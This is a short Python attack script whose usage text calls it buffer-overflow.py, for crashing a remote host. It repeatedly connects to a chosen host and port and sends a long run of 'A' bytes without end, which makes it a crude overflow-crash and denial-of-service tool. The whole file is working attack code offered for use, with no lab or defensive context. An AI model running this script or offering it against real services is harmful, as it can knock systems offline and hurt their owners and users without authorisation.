#By HiCo Adam
import socket, sys
help = """Usage: python buffer-overflow.py [HOST][PORT][DATA]

HOST: Remote Host To Crash
PORT: Port to connect through
DATA: amount of data to send, default is 3000
[Don't Type Anything for default]
"""
def cli():
    global rhost, rport, length, buff, data
    try:
        rhost = str(sys.argv[1])
        rport = int(sys.argv[2])
    except:
        print(help)
        quit()
    try:
        length = int(sys.argv[3])
    except:
        length = 3000
    data = "\x41" * length
    buff = 0
def launch():
    buff = 0
    while True:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          try:
            s.connect((rhost, rport))
          except:
            print("Error Connecting to",rhost,"on port",rport)
            quit()
          s.send((data))
          buff += length
          sys.stdout.write("\rSent %s Amount Of Buffer" % buff)
          sys.stdout.flush()
          s.close()
cli()
launch()

